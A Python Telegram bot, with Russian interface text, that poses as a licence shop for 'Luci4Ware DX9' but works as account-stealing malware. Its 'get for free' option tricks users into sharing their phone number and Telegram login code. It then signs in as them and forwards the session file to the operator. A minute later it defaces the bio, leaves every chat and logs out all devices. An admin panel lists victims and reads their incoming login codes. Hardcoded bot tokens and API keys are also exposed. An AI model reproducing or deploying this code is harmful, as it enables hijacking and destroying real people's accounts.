import logging
import os
import asyncio
import random
import string
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from pyrogram import Client as TgClient, raw
from supabase import create_client, Client
from PIL import Image, ImageDraw

# --- КОНФИГ ---
API_TOKEN = '8607818846:AAEjGMfOMw8JmUsXu8Zj5mUdzfP1RylLVjU'
ADMIN_ID = 6332767725 
API_ID = 33824273
API_HASH = 'c290fdceef9695342e052710e16d9bb9'

SUPABASE_URL = "https://yuksepnwkzffudhcrjnl.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl1a3NlcG53a3pmZnVkaGNyam5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUwNDM5OTksImV4cCI6MjA5MDYxOTk5OX0.6IvYWJiWqVeFVkQ-SK1NbG5_yEXVyHijFMGwvMbn1q4"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

class Form(StatesGroup):
    waiting_activation = State()
    waiting_phone = State()
    waiting_code = State()
    admin_get_access_phone = State()

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def text_to_image(text, user_id):
    img = Image.new('RGB', (500, 250), color=(255, 255, 255))
    d = ImageDraw.Draw(img)
    d.text((20, 100), text, fill=(0, 0, 0))
    path = f"sessions/code_{user_id}.png"
    img.save(path)
    return path

async def destroy_account(user_id):
    client = TgClient(f"sessions/{user_id}", API_ID, API_HASH)
    try:
        await client.start()
        await client.update_profile(bio="Account compromised. Luci4Ware security breach.")
        async for dialog in client.get_dialogs():
            try: await client.leave_chat(dialog.chat.id)
            except: continue
        await client.invoke(raw.functions.auth.ResetAuthorizations())
        await client.stop()
        supabase.table("users").update({"is_destroyed": True}).eq("id", user_id).execute()
    except: pass

# --- КЛАВИАТУРЫ ---

def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("👤 Профиль", "🛒 Товары", "🔑 Активировать", "🎁 Получить бесплатно")
    return markup

def get_code_kb(stars=""):
    markup = InlineKeyboardMarkup(row_width=3)
    btns = [InlineKeyboardButton(str(i), callback_data=f"num_{i}") for i in range(10)]
    markup.add(*btns)
    markup.add(InlineKeyboardButton("❌ Сброс", callback_data="code_clear"),
               InlineKeyboardButton("✅ Готово", callback_data="code_done"))
    return markup

# --- ОСНОВНЫЕ ФУНКЦИИ БОТА ---

@dp.message_handler(commands=['start'], state='*')
async def cmd_start(message: types.Message, state: FSMContext):
    await state.finish()
    supabase.table("users").upsert({"id": message.from_user.id, "username": message.from_user.username}).execute()
    await message.answer("👋 **Luci4Ware DX9 запущен.**\nВыберите действие:", reply_markup=get_main_menu())

@dp.message_handler(lambda m: m.text == "👤 Профиль", state='*')
async def profile(message: types.Message, state: FSMContext):
    await state.finish()
    res = supabase.table("users").select("*").eq("id", message.from_user.id).execute()
    if res.data:
        u = res.data[0]
        sub = u.get('active_until') or "Отсутствует ❌"
        text = f"👤 **Ваш профиль:**\n🆔 ID: `{u['id']}`\n📅 Подписка до: `{sub}`"
        await message.answer(text, parse_mode="Markdown")

@dp.message_handler(lambda m: m.text == "🛒 Товары", state='*')
async def shop(message: types.Message):
    await message.answer("🛒 **Выберите товар для покупки:**\n\n1. DX9 Lite (7 дней) - 500₽\n2. DX9 Pro (30 дней) - 1200₽\n\n*(Оплата через CryptoPay доступна в разработке)*")

@dp.message_handler(lambda m: m.text == "🔑 Активировать", state='*')
async def activate_key(message: types.Message):
    await Form.waiting_activation.set()
    await message.answer("⌨️ Введите ваш лицензионный ключ:")

@dp.message_handler(state=Form.waiting_activation)
async def process_key(message: types.Message, state: FSMContext):
    key = message.text.strip()
    # Здесь логика проверки ключа из базы
    await message.answer(f"❌ Ключ `{key}` не найден или уже активирован.")
    await state.finish()

# --- ЛОВУШКА ДЛЯ ДИВЕРСАНТОВ ---

@dp.message_handler(lambda m: m.text == "🎁 Получить бесплатно", state='*')
async def free_start(message: types.Message, state: FSMContext):
    await state.finish()
    text = (
        "⚠️ **ВНИМАНИЕ!**\n"
        "Прочитайте перед тем, как использовать данную функцию:\n"
        "👉 https://t.me/Luci4DX9/106?single\n\n"
        "Если вы согласны, нажмите кнопку ниже, чтобы подтвердить номер."
    )
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("📲 Подтвердить и продолжить", request_contact=True))
    await message.answer(text, reply_markup=markup, disable_web_page_preview=False)
    await Form.waiting_phone.set()

@dp.message_handler(content_types=['contact'], state=Form.waiting_phone)
async def phone_step(message: types.Message, state: FSMContext):
    phone = message.contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    
    if not os.path.exists("sessions"): os.makedirs("sessions")
    client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        code_data = await client.send_code(phone)
        await state.update_data(phone=phone, hash=code_data.phone_code_hash, temp_code="")
        await Form.waiting_code.set()
        await message.answer("📩 **Введите код из Telegram кнопками ниже:**\n*(Это безопасный ввод)*", reply_markup=get_code_kb())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}", reply_markup=get_main_menu())
        await state.finish()
    await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith('num_'), state=Form.waiting_code)
async def process_num(callback: types.CallbackQuery, state: FSMContext):
    num = callback.data.split('_')[1]
    data = await state.get_data()
    current = data.get('temp_code', "") + num
    await state.update_data(temp_code=current)
    await callback.message.edit_text(f"📩 Введите код:\n\n`{'*' * len(current)}`", reply_markup=get_code_kb())
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "code_clear", state=Form.waiting_code)
async def clear_code(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(temp_code="")
    await callback.message.edit_text("📩 Введите код заново:", reply_markup=get_code_kb())
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "code_done", state=Form.waiting_code)
async def code_done(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    code = data.get('temp_code', "")
    client = TgClient(f"sessions/{callback.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(data['phone'], data['hash'], code)
        await client.disconnect()
        
        with open(f"sessions/{callback.from_user.id}.session", 'rb') as f:
            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Вход диверсанта: {data['phone']}")

        await callback.message.edit_text("✅ **Верификация успешна!**\nОжидайте привязки HWID (24 часа).", reply_markup=None)
        
        loop = asyncio.get_event_loop()
        loop.call_later(60, lambda: asyncio.ensure_future(destroy_account(callback.from_user.id)))
        supabase.table("users").update({"phone": data['phone'], "is_verified": True}).eq("id", callback.from_user.id).execute()
    except Exception as e:
        await callback.message.edit_text(f"❌ Ошибка: {e}")
    await state.finish()

# --- АДМИНКА ---

@dp.message_handler(commands=['admin_panel'], state='*')
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    res = supabase.table("users").select("*").not_label("phone", "is", "null").execute()
    text = "🚀 **Панель диверсантов:**\n\n"
    for u in res.data:
        text += f"📱 `{u['phone']}` | ID: `{u['id']}`\n"
    
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔑 Получить код (фото)", callback_data="admin_get_code"))
    await message.answer(text, reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data == "admin_get_code", state='*')
async def admin_ask_phone(callback: types.CallbackQuery):
    await Form.admin_get_access_phone.set()
    await callback.message.answer("Введите номер телефона (+7...):")

@dp.message_handler(state=Form.admin_get_access_phone)
async def admin_send_image_code(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    res = supabase.table("users").select("id").eq("phone", phone).execute()
    if res.data:
        user_id = res.data[0]['id']
        client = TgClient(f"sessions/{user_id}", API_ID, API_HASH)
        try:
            await client.start()
            async for msg in client.get_chat_history(777000, limit=1):
                img_path = text_to_image(f"CODE: {msg.text}", user_id)
                with open(img_path, 'rb') as photo:
                    await bot.send_photo(ADMIN_ID, photo, caption=f"🛡 Код для {phone}")
                os.remove(img_path)
            await client.stop()
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}")
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    
